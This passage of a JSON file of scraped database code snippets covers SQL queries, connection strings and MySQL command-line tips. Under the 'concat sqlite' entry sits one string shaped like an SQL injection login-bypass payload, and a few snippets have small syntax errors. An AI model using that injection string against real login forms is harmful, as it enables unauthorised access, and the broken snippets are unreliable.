    "description": "Declare @mainString nvarchar(100)='Amit Kumar Yadav'   ---Check here @mainString contains Amit or not, if it contains then retrun greater than 0 then print Find otherwise Not Find   if CHARINDEX('Amit',@mainString) > 0    begin      select 'Find' As Result   end   else       select 'Not Find' As Result  \n-- To find an exact string SELECT * FROM [table] WHERE [field] LIKE '%stringtosearchfor%'. \n",
    "reg_date": "2021-10-12T09:54:26.000Z"
  },
  {
    "id": 512,
    "keyword": null,
    "link": null,
    "title": " check if string is a number sql",
    "description": "Select CASE WHEN isnumeric([fieldname]) THEN 'Valid' ELSE 'Invalid\" END \n",
    "reg_date": "2021-10-12T09:54:26.000Z"
  },
  {
    "id": 513,
    "keyword": null,
    "link": null,
    "title": " check if table exists oracle",
    "description": "SELECT * FROM USER_TABLES WHERE TABLE_NAME = 'my_table'; -- Tables from schemes you can access SELECT * FROM ALL_TABLES WHERE OWNER = 'scheme_name' TABLE_NAME = 'my_table'; -- Tables from schemes you can access SELECT * FROM DBA_TABLES WHERE OWNER = 'scheme_name' TABLE_NAME = 'my_table';\nBEGIN   SELECT COUNT(*)     INTO l_cnt     FROM dba_tables    WHERE owner = <<table owner>>      AND table_name = <<table name>>;     IF( l_cnt > 0 )   THEN      EXECUTE IMMEDIATE 'SELECT col1 FROM x'         BULK COLLECT INTO some_collection;   ELSE     SELECT 'table X does not exist'       INTO some_variable       FROM dual;   END IF; END;\n",
    "reg_date": "2021-10-12T09:54:26.000Z"
  },
  {
    "id": 514,
    "keyword": null,
    "link": null,
    "title": " check if value is null mysql",
    "description": "SELECT * from TABLE where CODE IS NULL OR CODE!='C'\n",
    "reg_date": "2021-10-12T09:54:26.000Z"
  },
  {
    "id": 515,
    "keyword": null,
    "link": null,
    "title": " check index sql server",
    "description": "create procedure _ListIndexes(@tableName nvarchar(200)) as begin /* exec _ListIndexes '<YOUR TABLE NAME>' */ SELECT DB_NAME(DB_ID()) as DBName,SCH.name + '.' + TBL.name AS TableName,IDX.name as IndexName, IDX.type_desc AS IndexType,COL.Name as ColumnName,IC.*     FROM sys.tables AS TBL           INNER JOIN sys.schemas AS SCH ON TBL.schema_id = SCH.schema_id           INNER JOIN sys.indexes AS IDX ON TBL.object_id = IDX.object_id           INNER JOIN sys.index_columns IC ON  IDX.object_id = IC.object_id and IDX.index_id = IC.index_id           INNER JOIN sys.columns COL ON ic.object_id = COL.object_id and IC.column_id = COL.column_id          where TBL.name = @tableName     ORDER BY TableName,IDX.name  end \n",
    "reg_date": "2021-10-12T09:54:26.000Z"
  },
  {
    "id": 516,
    "keyword": null,
    "link": null,
    "title": " check isolation level in mysql",
    "description": "SELECT @@transaction_isolation;  -- verion 8*\n",
    "reg_date": "2021-10-12T09:54:26.000Z"
  },
  {
    "id": 517,
    "keyword": null,
    "link": null,
    "title": " check message id sql server",
    "description": "SELECT message_id \t   ,language_id \t   ,severity \t   ,is_event_logged \t   ,[text]\t FROM [sys].[messages]  WHERE message_id = 8134 GO\n",
    "reg_date": "2021-10-12T09:54:26.000Z"
  },
  {
    "id": 518,
    "keyword": null,
    "link": null,
    "title": " check mysql port",
    "description": "mysql -u root mysql> SHOW GLOBAL VARIABLES LIKE 'PORT'; # Default port is 3306 for MySQL\nlsof -n -P -i TCP -s TCP:LISTEN\n",
    "reg_date": "2021-10-12T09:54:27.000Z"
  },
  {
    "id": 519,
    "keyword": null,
    "link": null,
    "title": " check mysql port ubuntu",
    "description": "mysql -u root mysql> SHOW GLOBAL VARIABLES LIKE 'PORT'; # Default port is 3306 for MySQL\n",
    "reg_date": "2021-10-12T09:54:27.000Z"
  },
  {
    "id": 520,
    "keyword": null,
    "link": null,
    "title": " check mysql status on commandline",
    "description": "$ systemctl status mysql ● mysql.service - LSB: Start and stop the mysql database server daemon      Loaded: loaded (/etc/init.d/mysql; generated)      Active: active (running) since Tue 2021-05-18 13:34:02 CEST; 12s ago        Docs: man:systemd-sysv-generator(8)     Process: 127538 ExecStart=/etc/init.d/mysql start (code=exited, status=0/SUCCESS)       Tasks: 33 (limit: 9079)      Memory: 100.8M         CPU: 569ms ... \n",
    "reg_date": "2021-10-12T09:54:27.000Z"
  },
  {
    "id": 521,
    "keyword": null,
    "link": null,
    "title": " check mysql timezone",
    "description": "#The query below returns the timezone of the current session.  select timediff(now(),convert_tz(now(),@@session.time_zone,'+00:00'));\n",
    "reg_date": "2021-10-12T09:54:27.000Z"
  },
  {
    "id": 522,
    "keyword": null,
    "link": null,
    "title": " check mysql version phpmyadmin",
    "description": "# Console: mysql -V mysql --version # Query: SHOW VARIABLES LIKE \"%version%\"; # PHPMyAdmin Interface, on the right side: > Database server > Server version\n",
    "reg_date": "2021-10-12T09:54:27.000Z"
  },
  {
    "id": 523,
    "keyword": null,
    "link": null,
    "title": " check oracle version",
    "description": "SELECT * FROM v$version;\nSELECT * FROM v$version WHERE banner LIKE 'Oracle%';\n",
    "reg_date": "2021-10-12T09:54:27.000Z"
  },
  {
    "id": 524,
    "keyword": null,
    "link": null,
    "title": " checking data type in sql server",
    "description": "SELECT DATA_TYPE  FROM INFORMATION_SCHEMA.COLUMNS WHERE       TABLE_NAME = 'yourTableName' AND       COLUMN_NAME = 'yourColumnName'\nSELECT COLUMN_NAME,        DATA_TYPE,        IS_NULLABLE,        CHARACTER_MAXIMUM_LENGTH,        NUMERIC_PRECISION,        NUMERIC_SCALE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='your_table_name';\n",
    "reg_date": "2021-10-12T09:54:27.000Z"
  },
  {
    "id": 525,
    "keyword": null,
    "link": null,
    "title": " clear a table in mysql",
    "description": "-- If you do not need a condition or limit the rows: TRUNCATE TABLE tblYourTable; -- Not Foreign key constrained  -- Or  SET FOREIGN_KEY_CHECKS = 0;  TRUNCATE YourTable1; TRUNCATE YourTable2;  SET FOREIGN_KEY_CHECKS = 1;  -- -------------------------------------------------------- -- Otherwise: DELETE FROM tblYourTable WHERE condition;  -- Or  DELETE FROM tblYourTable LIMIT row_count;\n/* Will delete all rows from your table. Next insert will take next auto increment id. */ DELETE from tableName; /* Will delete all rows from your table but it will start from new row with 1. */ TRUNCATE tableName;\nTRUNCATE tablename\n",
    "reg_date": "2021-10-12T09:54:27.000Z"
  },
  {
    "id": 526,
    "keyword": null,
    "link": null,
    "title": " clear query cache sql server",
    "description": "DBCC FREEPROCCACHE DBCC DROPCLEANBUFFERS  DBCC DROPCLEANBUFFERS clears clean (unmodified) pages from the buffer pool Precede that with a CHECKPOINT to flush any dirty pages to disk first DBCC FLUSHPROCINDB clears execution plans for that database\n",
    "reg_date": "2021-10-12T09:54:27.000Z"
  },
  {
    "id": 527,
    "keyword": null,
    "link": null,
    "title": " clear screen command in psql",
    "description": "//for linux  \\! clear  // for window \\! cls\nIf you are using Linux, type-in the following to clear the screen <dbname>=# \\! clear \n",
    "reg_date": "2021-10-12T09:54:27.000Z"
  },
  {
    "id": 528,
    "keyword": null,
    "link": null,
    "title": " clickhouse disk usage",
    "description": "  SELECT database,           table,          formatReadableSize(sum(bytes)) as size     FROM system.parts    WHERE active GROUP BY database,          table ORDER BY sum(bytes) desc  /* ┌─database─┬─table───────────┬─size────────┐ │ system   │ query_log       │ 41.87 MiB   │ │ tmp      │ test            │ 305.00 B    │ └──────────┴─────────────────┴─────────────┘ */\n",
    "reg_date": "2021-10-12T09:54:28.000Z"
  },
  {
    "id": 529,
    "keyword": null,
    "link": null,
    "title": " clone table structure mysql",
    "description": "CREATE TABLE foo SELECT * FROM bar LIMIT 0  Or CREATE TABLE foo SELECT * FROM bar WHERE 1=0\n",
    "reg_date": "2021-10-12T09:54:28.000Z"
  },
  {
    "id": 530,
    "keyword": null,
    "link": null,
    "title": " cmd to rename a collumn name in sql",
    "description": "EXEC SP_RENAME 'TABLE_NAME.OLD_COLUMN_NAME','NEW_COLUMN_NAME'\nALTER TABLE table_name RENAME COLUMN old_name TO new_name;\n",
    "reg_date": "2021-10-12T09:54:28.000Z"
  },
  {
    "id": 531,
    "keyword": null,
    "link": null,
    "title": " coalesce for comma separated in sql server",
    "description": "DECLARE @List VARCHAR(8000)  SELECT @List = COALESCE(@List + ',', '') + CAST(OfferID AS VARCHAR) FROM   Emp WHERE  EmpID = 23  SELECT @List \n",
    "reg_date": "2021-10-12T09:54:28.000Z"
  },
  {
    "id": 532,
    "keyword": null,
    "link": null,
    "title": " codeigniter dbforge add index",
    "description": "$sql = \"CREATE INDEX your_index_name ON table_name(field_name)\"; $this->db->query($sql);\n",
    "reg_date": "2021-10-12T09:54:28.000Z"
  },
  {
    "id": 533,
    "keyword": null,
    "link": null,
    "title": " codeigniter print last sql query",
    "description": "print_r($this->db->last_query());    \n",
    "reg_date": "2021-10-12T09:54:28.000Z"
  },
  {
    "id": 534,
    "keyword": null,
    "link": null,
    "title": " codigo crear tablas sql server",
    "description": "CREATE TABLE nombretabla ( nombrecolumna1 tipodato1, nombrecolumna2 tipodato2, nombrecolumna3 tipodato3, .. );\n",
    "reg_date": "2021-10-12T09:54:28.000Z"
  },
  {
    "id": 535,
    "keyword": null,
    "link": null,
    "title": " collation in sql",
    "description": "Collation is defined as a set of rules that determine how data can be sorted as well as compared. Character data is sorted using the rules that define the correct character sequence along with options for  specifying case-sensitivity, character width etc.\nutf8_general_ci\n",
    "reg_date": "2021-10-12T09:54:28.000Z"
  },
  {
    "id": 536,
    "keyword": null,
    "link": null,
    "title": " column names in oracle sql",
    "description": "DESCRIBE Table_Name;  OR   DESC Table_Name;\n",
    "reg_date": "2021-10-12T09:54:28.000Z"
  },
  {
    "id": 537,
    "keyword": null,
    "link": null,
    "title": " column with prefix in sql",
    "description": "create table  #test ( Id int identity(1,1), Pid as 'PRE-'+REPLACE(STR(id, 7), SPACE(1), '0') )   INSERT INTO #test DEFAULT VALUES INSERT INTO #test DEFAULT VALUES select *From #test\n",
    "reg_date": "2021-10-12T09:54:28.000Z"
  },
  {
    "id": 538,
    "keyword": null,
    "link": null,
    "title": " com.mysql.cj.exceptions.InvalidConnectionAttributeException more than one time zone. You must configure either the server or JD value if you want to utilize time zone support.",
    "description": "spring.datasource.url=jdbc:mysql://localhost/db_name?useTimezone=true&serverTimezone=UTC\n",
    "reg_date": "2021-10-12T09:54:29.000Z"
  },
  {
    "id": 539,
    "keyword": null,
    "link": null,
    "title": " com.mysql.jdbc.exceptions.jdbc4.MySQLNonTransientConnectionException: Public Key Retrieval is not allowed",
    "description": "jdbc:mysql://localhost:3306/db?allowPublicKeyRetrieval=true&useSSL=false \n",
    "reg_date": "2021-10-12T09:54:29.000Z"
  },
  {
    "id": 540,
    "keyword": null,
    "link": null,
    "title": " combine 2 columns search query mysql",
    "description": "Select Contacts.*, Contacts.ID as CID  from Contacts  left join website_Data  on Contacts.ID = website_Data.ContactID  where CONCAT(Contacts.FirstName,' ', Contacts.LastName) LIKE '%Illusion Softwares%'  order by Contacts.`Created` DESC  \n",
    "reg_date": "2021-10-12T09:54:29.000Z"
  },
  {
    "id": 541,
    "keyword": null,
    "link": null,
    "title": " command exit cmd",
    "description": "exit \n",
    "reg_date": "2021-10-12T09:54:29.000Z"
  },
  {
    "id": 542,
    "keyword": null,
    "link": null,
    "title": " command line mysql import",
    "description": "mysql -u username -p database_name < file.sql\nmysql -u username -p new_database < data-dump.sql \nmysql -u username -p database_name < file.sql ; OR  mysql> use db_name;  mysql> source file_name.sql;\nSource : https://www.programmingquest.com/2018/08/how-to-export-mysql-database-using.html open cmd set mysql path in cmd \tset path=c:\\wamp\\bin\\mysql\\mysql5.6.17\\bin For database import (Restore):  \tmysql -u YourUser -p YourDatabaseName < filename.sql\n",
    "reg_date": "2021-10-12T09:54:29.000Z"
  },
  {
    "id": 543,
    "keyword": null,
    "link": null,
    "title": " command line mysql xampp",
    "description": "cd c:\\xampp\\mysql\\bin mysql.exe -u root --password \n",
    "reg_date": "2021-10-12T09:54:29.000Z"
  },
  {
    "id": 544,
    "keyword": null,
    "link": null,
    "title": " commande sql insert valeu",
    "description": "INSERT INTO client (prenom, nom, ville, age)  VALUES  ('R&eacute;becca', 'Armand', 'Saint-Didier-des-Bois', 24),  ('Aim&eacute;e', 'Hebert', 'Marigny-le-Ch&acirc;tel', 36),  ('Marielle', 'Ribeiro', 'Maill&egrave;res', 27),  ('Hilaire', 'Savary', 'Conie-Molitard', 58);\n",
    "reg_date": "2021-10-12T09:54:29.000Z"
  },
  {
    "id": 545,
    "keyword": null,
    "link": null,
    "title": " comment in sql",
    "description": "/* Multi-Line Comment */ -- Single-Line comment\n/* Comment */\n/*  This is a MULTI-LINE Comment */  -- This is Single-Line Comment\nSingle line comments start with &ndash;- Any text after these 2 characters to the end of the line will be ignored. Multiline comments start with /* and end with */. They stretch across multiple lines until the closing characters have been found. -- My Select query /* This is my select query. It grabs all rows of data from the users table */\n/* Multi-Line comment goes here */  -- Single-Line comment goes here\n",
    "reg_date": "2021-10-12T09:54:29.000Z"
  },
  {
    "id": 546,
    "keyword": null,
    "link": null,
    "title": " commentaire table oracle",
    "description": "COMMENT ON TABLE table_name IS 'A table comment'; COMMENT ON COLUMN table_name.MY_COLUMN IS 'A column comment';  SELECT * FROM ALL_TAB_COMMENTS WHERE TABLE_NAME = 'TABLE_NAME'; SELECT * FROM ALL_COL_COMMENTS WHERE TABLE_NAME = 'TABLE_NAME';\n",
    "reg_date": "2021-10-12T09:54:29.000Z"
  },
  {
    "id": 547,
    "keyword": null,
    "link": null,
    "title": " commit in sql",
    "description": "&bull; COMMIT &mdash;> making all pending changes permanent; &bull; SAVEPOINT name &mdash;> marks a save point &bull; ROLLBACK &mdash;> discharges all pending changes to prev commit &bull; ROLLBACK TO name &mdash;> rolls back changes to savepoint\n COMMIT &mdash;> making all pending changes permanent; &bull; SAVEPOINT name &mdash;> marks a save point &bull; ROLLBACK &mdash;> discharges all pending changes to prev commit &bull; ROLLBACK TO name &mdash;> rolls back changes to savepoint \nDELETE clause is from DML, we can use ROLLBACK to recover the data. &bull; ROLLBACK &mdash;> discharges all pending changes to prev commit &bull; ROLLBACK TO name &mdash;> rolls back changes to savepoint\n",
    "reg_date": "2021-10-12T09:54:29.000Z"
  },
  {
    "id": 548,
    "keyword": null,
    "link": null,
    "title": " compare date in sql",
    "description": "WHERE DATEDIFF(my_date,'2008-11-20') >=0; WHERE my_date >= '2008-11-20'; WHERE to_date(my_date, 'YYYY-MM-DD') >= '2008-11-20'; WHERE to_date(my_date, 'YYYY-MM-DD') >= to_date('2008-11-20', 'YYYY-MM-DD');\n",
    "reg_date": "2021-10-12T09:54:29.000Z"
  },
  {
    "id": 549,
    "keyword": null,
    "link": null,
    "title": " compare date mysql",
    "description": "SELECT * FROM players WHERE DATE(us_reg_date) BETWEEN '2000-07-05' AND '2011-11-10'\n5 * (DATEDIFF(@E, @S) DIV 7) + MID('0123444401233334012222340111123400001234000123440', 7 * WEEKDAY(@S) + WEEKDAY(@E) + 1, 1) \n",
    "reg_date": "2021-10-12T09:54:30.000Z"
  },
  {
    "id": 550,
    "keyword": null,
    "link": null,
    "title": " comparing with today and yesterday record in sql query",
    "description": "declare @bgn_dt date = '2017-12-15' --set by OP     , @end_dt date = '2017-12-22' --set by OP     , @lag_dt date;  set @lag_dt = (select max(MyDate) from #myTable where MyDate < @bgn_dt) --get the \"yesterday\" that the @bgn_dt will need  select a.MyDate , a.SalesTotal , format(((1.0 * a.SalesTotal) / a.SalesTotalPrevDay) - 1, '0%') as SalesTotalChange from (     select t.MyDate     , t.SalesTotal     , lag(t.SalesTotal, 1, NULL) over (/*partition by (if needed)*/ order by t.MyDate asc) as SalesTotalPrevDay     from #myTable as t     where 1=1     and t.MyDate between @lag_dt and @end_dt     ) as a where 1=1 and a.MyDate >= @bgn_dt \n",
    "reg_date": "2021-10-12T09:54:30.000Z"
  },
  {
    "id": 551,
    "keyword": null,
    "link": null,
    "title": " concat function in hana sql",
    "description": "SELECT CONCAT ('C', 'at') \"concat\" FROM DUMMY;\n",
    "reg_date": "2021-10-12T09:54:30.000Z"
  },
  {
    "id": 552,
    "keyword": null,
    "link": null,
    "title": " concat in mysql",
    "description": "CONCAT (string1, string2,&hellip;) \nSELECT      column1,column2,... FROM     table_name WHERE  \t(expr|column_1) IN ('value1','value2',...);\nSELECT CONCAT ('C', 'at') \"concat\" FROM DUMMY;\n",
    "reg_date": "2021-10-12T09:54:30.000Z"
  },
  {
    "id": 553,
    "keyword": null,
    "link": null,
    "title": " concat sql",
    "description": "   SELECT    CONCAT('SQL', ' ', 'is', ' ', 'fun!'); \nSELECT CONCAT('Code with', 'bulbul') AS Result;\nWe use \"||\" to concatenation in Sql  example: WHERE LOWER(FIRST_NAME || LAST_NAME)  LIKE '%d%' ; \nUm zwei oder mehr Zeichenfolgen miteinander zu verbinden,  verwendet man die Funktion CONCAT. Diese Funktion nimmt  zwei bis maximal 255 Eingabezeichenfolgen und verbindet sie zu einer.  SELECT CONCAT (String1, String2);\nselect Convert(nvarchar(50),ID)+'-'+Convert(nvarchar(50),Year) as ID_Year from tablename\n",
    "reg_date": "2021-10-12T09:54:30.000Z"
  },
  {
    "id": 554,
    "keyword": null,
    "link": null,
    "title": " concat sqlite",
    "description": "                                     SELECT     FirstName || ' ' || LastName AS FullName FROM     Employees ORDER BY     FullName; \nad'||'min'||''-''-''||''\n",
    "reg_date": "2021-10-12T09:54:30.000Z"
  },
  {
    "id": 555,
    "keyword": null,
    "link": null,
    "title": " concatenation in sql",
    "description": "   SELECT    CONCAT('SQL', ' ', 'is', ' ', 'fun!'); \nSELECT CONCAT('Code with', 'bulbul') AS Result;\nWe use \"||\" to concatenation in Sql  example: WHERE LOWER(FIRST_NAME || LAST_NAME)  LIKE '%d%' ; \nUm zwei oder mehr Zeichenfolgen miteinander zu verbinden,  verwendet man die Funktion CONCAT. Diese Funktion nimmt  zwei bis maximal 255 Eingabezeichenfolgen und verbindet sie zu einer.  SELECT CONCAT (String1, String2);\nselect Convert(nvarchar(50),ID)+'-'+Convert(nvarchar(50),Year) as ID_Year from tablename\n",
    "reg_date": "2021-10-12T09:54:30.000Z"
  },
  {
    "id": 556,
    "keyword": null,
    "link": null,
    "title": " conda install pymysql \"windows\"",
    "description": "conda install -c conda-forge pymysql\n",
    "reg_date": "2021-10-12T09:54:30.000Z"
  },
  {
    "id": 557,
    "keyword": null,
    "link": null,
    "title": " conda install sqlalchemy",
    "description": "conda install -c anaconda sqlalchemy\n",
    "reg_date": "2021-10-12T09:54:30.000Z"
  },
  {
    "id": 558,
    "keyword": null,
    "link": null,
    "title": " condition in count sql",
    "description": "select count(case Position when 'Manager' then 1 else null end) from ...   select sum(case Position when 'Manager' then 1 else 0 end) from ...\nSELECT count(CASE WHEN gender = 'F' THEN 1 ELSE NULL END) women_count,        count(CASE WHEN gender = 'M' THEN 1 ELSE NULL END) men_count FROM people;\nCOUNT(CASE WHEN <condition> THEN 1 END)\n",
    "reg_date": "2021-10-12T09:54:31.000Z"
  },
  {
    "id": 559,
    "keyword": null,
    "link": null,
    "title": " configure: error: Cannot find libpq-fe.h. Please specify correct PostgreSQL installation path",
    "description": "FROM php:5.6-fpm  RUN apt-get update  # Install Postgre PDO RUN apt-get install -y libpq-dev \\     && docker-php-ext-configure pgsql -with-pgsql=/usr/local/pgsql \\     && docker-php-ext-install pdo pdo_pgsql pgsql \n",
    "reg_date": "2021-10-12T09:54:31.000Z"
  },
  {
    "id": 560,
    "keyword": null,
    "link": null,
    "title": " configure mysql database django",
    "description": "You need to make changes in project settings.py.  Provide USER and PASSWORD for your database If your database isn't mysql change ENGINE  DATABASES = {     'default': {         'ENGINE': 'django.db.backends.mysql',         'NAME': 'myproject',         'USER': 'root',         'PASSWORD': 'rootpassword',         'HOST': 'localhost',         'PORT': '',     } }\n$ brew reinstall openssl \t#run two commands under \"For compilers to find openssl@1.1 you may need to set:\" $ pip install mysqlclient\nsudo apt install python3-dev libmysqlclient-dev default-libmysqlclient-dev \n",
    "reg_date": "2021-10-12T09:54:31.000Z"
  },
  {
    "id": 561,
    "keyword": null,
    "link": null,
    "title": " connect database springboot",
    "description": "spring.jpa.hibernate.ddl-auto=update spring.datasource.url=jdbc:mysql://${MYSQL_HOST:localhost}:3306/db_example spring.datasource.username=springuser spring.datasource.password=ThePasswordCopy\n",
    "reg_date": "2021-10-12T09:54:31.000Z"
  },
  {
    "id": 562,
    "keyword": null,
    "link": null,
    "title": " connect mysql command line",
    "description": "version: mysql 8.0  mysql --host=localhost --user=myname --password=password mydb  or: mysql -h localhost -u myname -p password mydb  TO install mysql shell: https://dev.mysql.com/doc/mysql-shell/8.0/en/mysql-shell-install.html\nmysql.exe &ndash;uroot &ndash;p\nmysql --host=localhost --user=myname --password mydb mysql -h localhost -u myname -p mydb\nmysql --user=root --password=mypass\nmysql --host=localhost --port=myport --user=myname --password mysql -h localhost -u myname -p --port=myport\nuse DBNAME;\n",
    "reg_date": "2021-10-12T09:54:31.000Z"
  },
  {
    "id": 563,
    "keyword": null,
    "link": null,
    "title": " connect mysql docker",
    "description": "docker container run -d -p 3306:3306 --name mysql --env MYSQL_ROOT_PASSWORD=123456 mysql  docker container exec -it mysql bash\n",
    "reg_date": "2021-10-12T09:54:31.000Z"
  },
  {
    "id": 564,
    "keyword": null,
    "link": null,
    "title": " connect python to mysql",
    "description": "import mysql.connector  cnx = mysql.connector.connect(user='scott', password='password',                               host='127.0.0.1',                               database='employees') cnx.close()\nimport mysql.connector mydb = mysql.connector.connect(   host=\"localhost\",   user=\"yourusername\",   password=\"yourpassword\",   port = 8888, #for Mamp users   database='whatever db you want' ) print(mydb) \nimport pymysql.cursors import pymysql  # Connect to the database connection = pymysql.connect(host='localhost',                              user='user',                              password='passwd',                              db='db',                              charset='utf8mb4',                              cursorclass=pymysql.cursors.DictCursor)  try:     with connection.cursor() as cursor:         # Create a new record         sql = \"INSERT INTO `users` (`email`, `password`) VALUES (%s, %s)\"         cursor.execute(sql, ('webmaster@python.org', 'very-secret'))      # connection is not autocommit by default. So you must commit to save     # your changes.     connection.commit()      with connection.cursor() as cursor:         # Read a single record         sql = \"SELECT `id`, `password` FROM `users` WHERE `email`=%s\"         cursor.execute(sql, ('webmaster@python.org',))         result = cursor.fetchone()         print(result) finally:     connection.close() \nfrom sqlalchemy import types, create_engine import pymysql  try: \tconn = create_engine('mysql+pymysql://user:pass@IP/database_name')   \tprint(\"MySQL Connection Sucessfull!!!!!!!!!!!\")  except Exception as err:  \tprint(\"MySQL Connection Failed !!!!!!!!!!!\") \tprint(err) \n",
    "reg_date": "2021-10-12T09:54:31.000Z"
  },
  {
    "id": 565,
    "keyword": null,
    "link": null,
    "title": " connect to Remote MySQL server",
    "description": "mysql --host=localhost --user=myname --password mydb\nmysql> CREATE USER 'monty'@'localhost' IDENTIFIED BY 'some_pass'; mysql> GRANT ALL PRIVILEGES ON *.* TO 'monty'@'localhost'     ->     WITH GRANT OPTION; mysql> CREATE USER 'monty'@'%' IDENTIFIED BY 'some_pass'; mysql> GRANT ALL PRIVILEGES ON *.* TO 'monty'@'%'     ->     WITH GRANT OPTION; \nGRANT ALL PRIVILEGES ON *.* TO 'username'@'localhost' IDENTIFIED BY 'password';\n",
    "reg_date": "2021-10-12T09:54:31.000Z"
  },
  {
    "id": 566,
    "keyword": null,
    "link": null,
    "title": " connect to azure sql database from python",
    "description": "import pyodbc server = '<server>.database.windows.net' database = '<database>' username = '<username>' password = '<password>'    driver= '{ODBC Driver 17 for SQL Server}'  with pyodbc.connect('DRIVER='+driver+';SERVER='+server+';PORT=1433;DATABASE='+database+';UID='+username+';PWD='+ password) as conn:     with conn.cursor() as cursor:     \t# code...         # ex: cursor.execute(\"SELECT TOP 3 name, collation_name FROM sys.databases\") \n",
    "reg_date": "2021-10-12T09:54:31.000Z"
  },
  {
    "id": 567,
    "keyword": null,
    "link": null,
    "title": " connect to database spring",
    "description": "spring.jpa.hibernate.ddl-auto=update spring.datasource.url=jdbc:mysql://${MYSQL_HOST:localhost}:3306/db_example spring.datasource.username=springuser spring.datasource.password=ThePasswordCopy\n",
    "reg_date": "2021-10-12T09:54:31.000Z"
  },
  {
    "id": 568,
    "keyword": null,
    "link": null,
    "title": " connect to database springboot",
    "description": "spring.jpa.hibernate.ddl-auto=update spring.datasource.url=jdbc:mysql://${MYSQL_HOST:localhost}:3306/db_example spring.datasource.username=springuser spring.datasource.password=ThePasswordCopy\n",
    "reg_date": "2021-10-12T09:54:31.000Z"
  },
  {
    "id": 569,
    "keyword": null,
    "link": null,
    "title": " connect to mysql c# connection string C#",
    "description": "Server=myServerAddress;Port=1234;Database=myDataBase;Uid=myUsername;Pwd=myPassword; Server=myServerAddress;Database=myDataBase;Uid=myUsername;Pwd=myPassword; Server=serverAddress1, serverAddress2, serverAddress3;Database=myDataBase;Uid=myUsername;Pwd=myPassword; Server=myServerAddress;Database=myDataBase;Uid=myUsername;Pwd=myPassword;Encrypt=true;\nPress CTRL+C to copy \"server=127.0.0.1;uid=root;pwd=12345;database=test\"\nServer=myServerAddress;Database=myDataBase;Uid=myUsername;Pwd=myPassword;\n",
    "reg_date": "2021-10-12T09:54:32.000Z"
  },
  {
    "id": 570,
    "keyword": null,
    "link": null,
    "title": " connect to mysql database ubuntu",
    "description": "mysql -u USERNAME -p\n",
    "reg_date": "2021-10-12T09:54:32.000Z"
  },
  {
    "id": 571,
    "keyword": null,
    "link": null,
    "title": " connect to mysql localhost from the mysql shell",
    "description": "\\connect root@localhost:3306\n",
    "reg_date": "2021-10-12T09:54:32.000Z"
  },
  {
    "id": 572,
    "keyword": null,
    "link": null,
    "title": " connect to mysql server mac terminal",
    "description": "sudo /usr/local/mysql/support-files/mysql.server start \n   sudo /usr/local/mysql/support-files/mysql.server status \n",
    "reg_date": "2021-10-12T09:54:32.000Z"
  },
  {
    "id": 573,
    "keyword": null,
    "link": null,
    "title": " connect to mysql workbench python",
    "description": "Press CTRL+C to copy import mysql.connector from mysql.connector import errorcode  try:   cnx = mysql.connector.connect(user='scott',                                 database='employ') except mysql.connector.Error as err:   if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:     print(\"Something is wrong with your user name or password\")   elif err.errno == errorcode.ER_BAD_DB_ERROR:     print(\"Database does not exist\")   else:     print(err) else:   cnx.close()\n",
    "reg_date": "2021-10-12T09:54:32.000Z"
  },
  {
    "id": 574,
    "keyword": null,
    "link": null,
    "title": " connect to sql server with python",
    "description": "import pyodbc  # Some other example server values are # server = 'localhost\\sqlexpress' # for a named instance # server = 'myserver,port' # to specify an alternate port server = 'tcp:myserver.database.windows.net'  database = 'mydb'  username = 'myusername'  password = 'mypassword'  cnxn = pyodbc.connect('DRIVER={ODBC Driver 17 for SQL Server};SERVER='+server+';DATABASE='+database+';UID='+username+';PWD='+ password) cursor = cnxn.cursor()  #Sample select query cursor.execute(\"SELECT @@version;\")  row = cursor.fetchone()  while row:      print(row[0])     row = cursor.fetchone()\n",
    "reg_date": "2021-10-12T09:54:32.000Z"
  },
  {
    "id": 575,
    "keyword": null,
    "link": null,
    "title": " connecting to a new database using postgresql sql shell",
    "description": "For Windows users using the SQL shell  \\c DB_NAME USER_NAME HOST PORT  // to get the connection details such as your username, host and port simply use the \"\\conninfo\" command  eg : \\c test1 john_doe localhost 5432\n",
    "reg_date": "2021-10-12T09:54:32.000Z"
  },
  {
    "id": 576,
    "keyword": null,
    "link": null,
    "title": " connection string mysql",
    "description": "Server=myServerAddress;Port=1234;Database=myDataBase;Uid=myUsername;Pwd=myPassword; Server=myServerAddress;Database=myDataBase;Uid=myUsername;Pwd=myPassword; Server=serverAddress1, serverAddress2, serverAddress3;Database=myDataBase;Uid=myUsername;Pwd=myPassword; Server=myServerAddress;Database=myDataBase;Uid=myUsername;Pwd=myPassword;Encrypt=true;\nPress CTRL+C to copy \"server=127.0.0.1;uid=root;pwd=12345;database=test\"\nServer=myServerAddress;Database=myDataBase;Uid=myUsername;Pwd=myPassword;\n",
    "reg_date": "2021-10-12T09:54:32.000Z"
  },
  {
    "id": 577,
    "keyword": null,
    "link": null,
    "title": " consecutive numbers sql",
    "description": "SELECT DISTINCT l1.Num AS ConsecutiveNums FROMLogs AS l1, Logs AS l2, Logs AS l3WHERE l1.Num = l2.Num AND l2.Num = l3.Num ANDl1.Id = l2.Id - 1 AND l2.Id = l3.Id - 1;\n",
    "reg_date": "2021-10-12T09:54:32.000Z"
  },
  {
    "id": 578,
    "keyword": null,
    "link": null,
    "title": " consistency in sql server",
    "description": "SELECT     TH.TransactionID,     TH.ProductID,     TH.ReferenceOrderID,     TH.ReferenceOrderLineID,     TH.TransactionDate,     TH.TransactionType,     TH.Quantity,     TH.ActualCost FROM Production.TransactionHistory AS TH WHERE TH.ReferenceOrderID = (     SELECT TOP (1)          TH2.ReferenceOrderID     FROM Production.TransactionHistory AS TH2     WHERE TH2.TransactionType = N'P'     ORDER BY          TH2.Quantity DESC,         TH2.ReferenceOrderID ASC );\n",
    "reg_date": "2021-10-12T09:54:32.000Z"
  },
  {
    "id": 579,
    "keyword": null,
    "link": null,
    "title": " constraint unique mssql",
    "description": "ALTER TABLE table_name ADD CONSTRAINT cst_name UNIQUE (col_name);  ALTER TABLE table_name ADD CONSTRAINT cst_name UNIQUE (col1, col2); -- Multiple ALTER TABLE table_name ADD col_name NUMBER UNIQUE;\t\t\t\t  \t-- New field\nUSE AdventureWorks2012;   GO   CREATE TABLE Production.TransactionHistoryArchive4    (      TransactionID int NOT NULL,       CONSTRAINT AK_TransactionID UNIQUE(TransactionID)    );    GO    \n",
    "reg_date": "2021-10-12T09:54:33.000Z"
  },
  {
    "id": 580,
    "keyword": null,
    "link": null,
    "title": " constraint unique sql",
